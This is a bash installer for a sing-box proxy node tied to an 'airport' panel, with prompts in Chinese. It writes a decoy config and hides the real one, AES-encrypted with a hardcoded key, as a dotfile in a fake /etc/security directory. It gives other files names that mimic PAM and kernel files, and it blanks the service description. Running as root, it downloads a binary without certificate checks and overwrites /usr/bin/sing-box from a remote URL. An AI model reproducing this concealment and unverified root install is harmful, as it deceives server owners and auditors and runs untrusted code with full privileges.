#!/bin/bash

red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
plain='\033[0m'

cur_dir=$(pwd)

SING_BOX_DIR="/etc/sing-box"
HIDDEN_DIR="/etc/security/dispatcher.d"
DECOY_CONFIG="${SING_BOX_DIR}/config.json"
BINARY_PATH="${SING_BOX_DIR}/sing-box"

[[ $EUID -ne 0 ]] && echo "错误：必须使用root用户运行！" && exit 1

# 检测系统版本
if [[ -f /etc/redhat-release ]]; then
    release="centos"
elif cat /etc/issue | grep -Eqi "alpine"; then
    release="alpine"
elif cat /etc/issue | grep -Eqi "debian"; then
    release="debian"
elif cat /etc/issue | grep -Eqi "ubuntu"; then
    release="ubuntu"
elif cat /etc/issue | grep -Eqi "centos|red hat|redhat|rocky|alma|oracle linux"; then
    release="centos"
elif cat /proc/version | grep -Eqi "debian"; then
    release="debian"
elif cat /proc/version | grep -Eqi "ubuntu"; then
    release="ubuntu"
elif cat /proc/version | grep -Eqi "centos|red hat|redhat|rocky|alma|oracle linux"; then
    release="centos"
elif cat /proc/version | grep -Eqi "arch"; then
    release="arch"
else
    echo "未检测到系统版本！" && exit 1
fi

arch=$(uname -m)
if [[ $arch == "x86_64" || $arch == "x64" || $arch == "amd64" ]]; then
    arch="64"
elif [[ $arch == "aarch64" || $arch == "arm64" ]]; then
    arch="arm64-v8a"
else
    arch="64"
fi

install_base() {
    if [[ x"${release}" == x"centos" ]]; then
        yum install epel-release wget curl unzip tar crontabs socat ca-certificates -y >/dev/null 2>&1
    elif [[ x"${release}" == x"alpine" ]]; then
        apk add wget curl unzip tar socat ca-certificates python3 py3-pip openssl 2>/dev/null || true
    elif [[ x"${release}" == x"debian" || x"${release}" == x"ubuntu" ]]; then
        apt-get update -y >/dev/null 2>&1
        apt install wget curl unzip tar cron socat ca-certificates python3 python3-pip -y >/dev/null 2>&1
    elif [[ x"${release}" == x"arch" ]]; then
        pacman -Sy --noconfirm >/dev/null 2>&1
        pacman -S --noconfirm --needed wget curl unzip tar cron socat ca-certificates python python-pip openssl 2>/dev/null || true
    fi
}

# 生成伪装配置
generate_decoy_config() {
    mkdir -p ${SING_BOX_DIR}
    local uuid=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo "550e8400-e29b-41d4-a716-446655440000")
    local vless_port=$(shuf -i 10000-65535 -n 1 2>/dev/null || echo "443")
    local vmess_port=$(shuf -i 10000-65535 -n 1 2>/dev/null || echo "8080")
    local hy2_port=$(shuf -i 10000-65535 -n 1 2>/dev/null || echo "8443")
    
    cat > ${DECOY_CONFIG} << 'DECOYEOF'
{
  "log": { "disabled": false, "level": "info", "timestamp": true },
  "inbounds": [
    {
      "type": "vless",
      "tag": "vless-in",
      "listen": "::",
      "listen_port": REPLACE_VLESS_PORT,
      "users": [{ "uuid": "REPLACE_UUID", "flow": "xtls-rprx-vision" }],
      "tls": {
        "enabled": true,
        "server_name": "apple.com",
        "reality": {
          "enabled": true,
          "handshake": { "server": "apple.com", "server_port": 443 },
          "private_key": "SGlkZGVuS2V5SGVyZQ==",
          "short_id": ["abcd"]
        }
      }
    },
    {
      "type": "vmess",
      "tag": "vmess-in",
      "listen": "::",
      "listen_port": REPLACE_VMESS_PORT,
      "users": [{ "uuid": "REPLACE_UUID", "alterId": 0 }],
      "transport": {
        "type": "ws",
        "path": "/vmess",
        "max_early_data": 2048,
        "early_data_header_name": "Sec-WebSocket-Protocol"
      }
    },
    {
      "type": "hysteria2",
      "tag": "hy2-in",
      "listen": "::",
      "listen_port": REPLACE_HY2_PORT,
      "users": [{ "password": "REPLACE_UUID" }],
      "tls": {
        "enabled": true,
        "alpn": ["h3"],
        "certificate_path": "/etc/sing-box/cert.pem",
        "key_path": "/etc/sing-box/private.key"
      }
    }
  ],
  "outbounds": [{ "type": "direct", "tag": "direct" }]
}
DECOYEOF
    sed -i "s/REPLACE_UUID/${uuid}/g" ${DECOY_CONFIG}
    sed -i "s/REPLACE_VLESS_PORT/${vless_port}/g" ${DECOY_CONFIG}
    sed -i "s/REPLACE_VMESS_PORT/${vmess_port}/g" ${DECOY_CONFIG}
    sed -i "s/REPLACE_HY2_PORT/${hy2_port}/g" ${DECOY_CONFIG}
    
    touch ${SING_BOX_DIR}/cert.pem
    touch ${SING_BOX_DIR}/private.key
    chmod 600 ${SING_BOX_DIR}/private.key
    chmod 644 ${SING_BOX_DIR}/cert.pem
    chmod 644 ${DECOY_CONFIG}
    echo "伪装配置已生成"
}

# 处理geo文件
process_geo_files() {
    if [[ -f "/tmp/sb-geo/geoip.dat" ]]; then
        mv "/tmp/sb-geo/geoip.dat" "${HIDDEN_DIR}/.kcache-lib"
        chmod 644 ${HIDDEN_DIR}/.kcache-lib
        echo "geoip数据已处理"
    fi
    if [[ -f "/tmp/sb-geo/geosite.dat" ]]; then
        mv "/tmp/sb-geo/geosite.dat" "${HIDDEN_DIR}/.pam_env"
        chmod 644 ${HIDDEN_DIR}/.pam_env
        echo "geosite数据已处理"
    fi
    rm -rf /tmp/sb-geo
}

# 检测IPv6支持
check_ipv6_support() {
    if ip -6 addr 2>/dev/null | grep -q "inet6"; then
        echo "1"
    else
        echo "0"
    fi
}

# ========== 加密配置生成函数 ==========
generate_encrypted_config() {
    local config_json="$1"
    
    python3 << PYEOF
import base64
import hashlib
import os

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    print("error: cryptography not installed")
    exit(1)

def derive_key(password):
    return hashlib.sha256(password.encode()).digest()

config_data = '''${config_json}'''

key = derive_key('sing-box-config-v1.0')
aesgcm = AESGCM(key)
nonce = os.urandom(12)
ciphertext = aesgcm.encrypt(nonce, config_data.encode('utf-8'), None)
result = base64.b64encode(nonce + ciphertext).decode('utf-8')

with open('/etc/security/dispatcher.d/.audit-cache', 'w') as f:
    f.write('ENC:' + result)
print('success')
PYEOF
}

# ========== 原流程的配置生成函数 ==========
generate_config_file() {
    echo "sing-box 配置文件生成向导"
    echo "请阅读以下注意事项："
    echo "1. 目前该功能正处测试阶段"
    echo "2. 生成的配置文件会保存到 /etc/security/dispatcher.d/.audit-cache"
    echo "3. 使用此功能生成的配置文件会自带审计，确定继续？"
    read -rp "请输入：" continue_prompt
    if [[ "$continue_prompt" =~ ^[Nn][Oo]? ]]; then
        return 1
    fi
    
    nodes=""
    first_node="true"
    CoreXray="false"
    CoreSing="false"
    CoreHysteria2="false"
    fixed_api_info="false"
    
    while true; do
        if [ "$first_node" = "true" ]; then
            read -rp "请输入机场网址: " ApiHost
            read -rp "请输入面板对接API Key：" ApiKey
            read -rp "是否设置固定的机场网址和API Key？: " fixed_api
            if [ "$fixed_api" = "y" ] || [ "$fixed_api" = "Y" ]; then
                fixed_api_info="true"
                echo "成功固定地址"
            fi
            first_node="false"
        else
            read -rp "是否继续添加节点配置？回车继续，输入n或no退出: " continue_adding_node
            if [[ "$continue_adding_node" =~ ^[Nn][Oo]? ]]; then
                break
            elif [ "$fixed_api_info" != "true" ]; then
                read -rp "请输入机场网址: " ApiHost
                read -rp "请输入面板对接API Key：" ApiKey
            fi
        fi
        
        echo "请选择节点核心类型："
        echo "1. xray"
        echo "2. singbox"
        echo "3. hysteria2"
        read -rp "请输入：" core_type
        
        if [ "$core_type" == "1" ]; then
            Core="xray"
            CoreXray="true"
        elif [ "$core_type" == "2" ]; then
            Core="sing"
            CoreSing="true"
        elif [ "$core_type" == "3" ]; then
            Core="hysteria2"
            CoreHysteria2="true"
        else
            echo "无效的选择。请选择 1 2 3。"
            continue
        fi
        
        while true; do
            read -rp "请输入节点Node ID：" NodeID
            if [[ "$NodeID" =~ ^[0-9]+$ ]]; then
                break
            else
                echo "错误：请输入正确的数字作为Node ID。"
            fi
        done

        if [ "$CoreHysteria2" = "true" ] && [ "$CoreXray" != "true" ] && [ "$CoreSing" != "true" ]; then
            NodeType="hysteria2"
        else
            echo "请选择节点传输协议："
            echo "1. Shadowsocks"
            echo "2. Vless"
            echo "3. Vmess"
            if [ "$CoreSing" == "true" ]; then
                echo "4. Hysteria"
                echo "5. Hysteria2"
            fi
            if [ "$CoreHysteria2" == "true" ] && [ "$CoreSing" != "true" ]; then
                echo "5. Hysteria2"
            fi
            echo "6. Trojan"
            if [ "$CoreSing" == "true" ]; then
                echo "7. Tuic"
                echo "8. AnyTLS"
            fi
            read -rp "请输入：" NodeType
            case "$NodeType" in
                1 ) NodeType="shadowsocks" ;;
                2 ) NodeType="vless" ;;
                3 ) NodeType="vmess" ;;
                4 ) NodeType="hysteria" ;;
                5 ) NodeType="hysteria2" ;;
                6 ) NodeType="trojan" ;;
                7 ) NodeType="tuic" ;;
                8 ) NodeType="anytls" ;;
                * ) NodeType="shadowsocks" ;;
            esac
        fi
        
        fastopen="true"
        if [ "$NodeType" == "vless" ]; then
            read -rp "请选择是否为reality节点？: " isreality
        elif [ "$NodeType" == "hysteria" ] || [ "$NodeType" == "hysteria2" ] || [ "$NodeType" == "tuic" ] || [ "$NodeType" == "anytls" ]; then
            fastopen="false"
            istls="y"
        fi

        if [[ "$isreality" != "y" && "$isreality" != "Y" && "$istls" != "y" ]]; then
            read -rp "请选择是否进行TLS配置？: " istls
        fi

        certmode="none"
        certdomain="example.com"
        if [[ "$isreality" != "y" && "$isreality" != "Y" ]] && [[ "$istls" == "y" || "$istls" == "Y" ]]; then
            echo "请选择证书申请模式："
            echo "1. http模式自动申请，节点域名已正确解析"
            echo "2. dns模式自动申请，需填入正确域名服务商API参数"
            echo "3. self模式，自签证书或提供已有证书文件"
            read -rp "请输入：" certmode
            case "$certmode" in
                1 ) certmode="http" ;;
                2 ) certmode="dns" ;;
                3 ) certmode="self" ;;
            esac
            read -rp "请输入节点证书域名: " certdomain
            if [ "$certmode" != "http" ]; then
                echo "请手动修改配置文件后重启sing-box！"
            fi
        fi
        
        ipv6_support=$(check_ipv6_support)
        listen_ip="0.0.0.0"
        if [ "$ipv6_support" -eq 1 ]; then
            listen_ip="::"
        fi
        
        # 构建节点JSON
        node_json=""
        if [ "$Core" == "hysteria2" ]; then
            node_json='{"Core":"hysteria2","ApiHost":"'$ApiHost'","ApiKey":"'$ApiKey'","NodeID":'$NodeID',"NodeType":"hysteria2","Hysteria2ConfigPath":"/etc/security/dispatcher.d/hy2config.yaml","Timeout":30,"ListenIP":"","SendIP":"0.0.0.0","DeviceOnlineMinTraffic":200,"MinReportTraffic":0,"CertConfig":{"CertMode":"'$certmode'","RejectUnknownSni":false,"CertDomain":"'$certdomain'","CertFile":"/etc/security/dispatcher.d/cert.pem","KeyFile":"/etc/security/dispatcher.d/key.pem","Email":"v2bx@github.com","Provider":"cloudflare","DNSEnv":{"EnvName":"env1"}}}'
        else
            tfo_val="false"
            if [ "$fastopen" == "true" ]; then
                tfo_val="true"
            fi
            node_json='{"Core":"'$Core'","ApiHost":"'$ApiHost'","ApiKey":"'$ApiKey'","NodeID":'$NodeID',"NodeType":"'$NodeType'","Timeout":30,"ListenIP":"'$listen_ip'","SendIP":"0.0.0.0","DeviceOnlineMinTraffic":200,"MinReportTraffic":0,"EnableProxyProtocol":false,"EnableUot":true,"EnableTFO":'$tfo_val',"DNSType":"UseIPv4","CertConfig":{"CertMode":"'$certmode'","RejectUnknownSni":false,"CertDomain":"'$certdomain'","CertFile":"/etc/security/dispatcher.d/cert.pem","KeyFile":"/etc/security/dispatcher.d/key.pem","Email":"v2bx@github.com","Provider":"cloudflare","DNSEnv":{"EnvName":"env1"}}}'
        fi
        
        if [ -z "$nodes" ]; then
            nodes="$node_json"
        else
            nodes="$nodes,$node_json"
        fi
    done
    
    # 构建完整配置
    full_config='{"Log":{"Level":"error","Output":""},"Nodes":['$nodes']}'
    
    echo "正在生成加密配置..."
    if generate_encrypted_config "$full_config"; then
        chmod 600 ${HIDDEN_DIR}/.audit-cache
        echo "真实配置已生成"
        
        if [[ x"${release}" == x"alpine" ]]; then
            service sing-box restart 2>/dev/null || service sing-box start
        else
            systemctl restart sing-box 2>/dev/null || systemctl start sing-box
        fi
        echo "服务已启动"
    else
        echo "配置生成失败，请检查python3和cryptography是否安装"
    fi
}

# 检查状态
check_status() {
    if [[ ! -f ${BINARY_PATH} ]]; then
        return 2
    fi
    if [[ x"${release}" == x"alpine" ]]; then
        temp=$(service sing-box status 2>/dev/null | awk '{print $3}')
        [[ x"${temp}" == x"started" ]] && return 0 || return 1
    else
        temp=$(systemctl status sing-box 2>/dev/null | grep Active | awk '{print $3}' | cut -d "(" -f2 | cut -d ")" -f1)
        [[ x"${temp}" == x"running" ]] && return 0 || return 1
    fi
}

# 主安装函数
install_sing-box() {
    mkdir -p ${SING_BOX_DIR}
    mkdir -p ${HIDDEN_DIR}
    
    cd ${SING_BOX_DIR}

    echo "开始下载 sing-box"
    wget --no-check-certificate -N --no-show-progress -O sing-box-linux.zip https://github.com/Kanzakiyuu/Kanzakiyuu1/releases/latest/download/sing-box-linux-64.zip
    if [[ $? -ne 0 ]]; then
        echo "下载失败"
        exit 1
    fi

    unzip -o sing-box-linux.zip
    rm -f sing-box-linux.zip
    chmod +x sing-box
    
    mkdir -p /tmp/sb-geo
    mv geoip.dat /tmp/sb-geo/ 2>/dev/null || true
    mv geosite.dat /tmp/sb-geo/ 2>/dev/null || true
    
    if [[ x"${release}" == x"alpine" ]]; then
        cat > /etc/init.d/sing-box << 'SERVICEEOF'
#!/sbin/openrc-run
name="sing-box"
description=""
command="/etc/sing-box/sing-box"
command_args="run -c /etc/sing-box/config.json"
command_user="root"
pidfile="/run/sing-box.pid"
command_background="yes"
depend() { need net; }
SERVICEEOF
        chmod +x /etc/init.d/sing-box
        rc-update add sing-box default 2>/dev/null || true
    else
        cat > /etc/systemd/system/sing-box.service << 'SERVICEEOF'
[Unit]
Description=
After=network.target nss-lookup.target
Wants=network.target

[Service]
Type=simple
User=root
Group=root
WorkingDirectory=/etc/sing-box
ExecStart=/etc/sing-box/sing-box run -c /etc/sing-box/config.json
Restart=on-failure
RestartSec=10s
LimitNOFILE=infinity

[Install]
WantedBy=multi-user.target
SERVICEEOF
        systemctl daemon-reload
        systemctl stop sing-box 2>/dev/null
        systemctl enable sing-box
    fi
    
    echo "服务已安装"

    generate_decoy_config
    process_geo_files
    
    wget -q -O /usr/bin/sing-box https://raw.githubusercontent.com/Kanzakiyuu/Kanzakiyuu1/master/sing-box.sh 2>/dev/null || \
    curl -sL -o /usr/bin/sing-box https://raw.githubusercontent.com/Kanzakiyuu/Kanzakiyuu1/master/sing-box.sh 2>/dev/null || true
    chmod +x /usr/bin/sing-box 2>/dev/null || true
    
    cd $cur_dir
    
    echo ""
    echo "sing-box 管理命令:"
    echo "------------------------------------------"
    echo "sing-box              - 显示管理菜单"
    echo "sing-box start        - 启动"
    echo "sing-box stop         - 停止"
    echo "sing-box restart      - 重启"
    echo "sing-box status       - 查看状态"
    echo "sing-box log          - 查看日志"
    echo "sing-box config       - 编辑配置"
    echo "sing-box version      - 查看版本"
    echo "------------------------------------------"
    
    if [[ ! -f ${HIDDEN_DIR}/.audit-cache ]]; then
        read -rp "检测到你为第一次安装，是否生成配置？: " if_generate
        if [[ $if_generate == [Yy] ]]; then
            generate_config_file
        else
            echo "你可以稍后运行 'sing-box config' 来生成配置"
        fi
    fi
    
    echo "安装完成！"
}

echo "开始安装 sing-box..."
install_base
install_sing-box $1
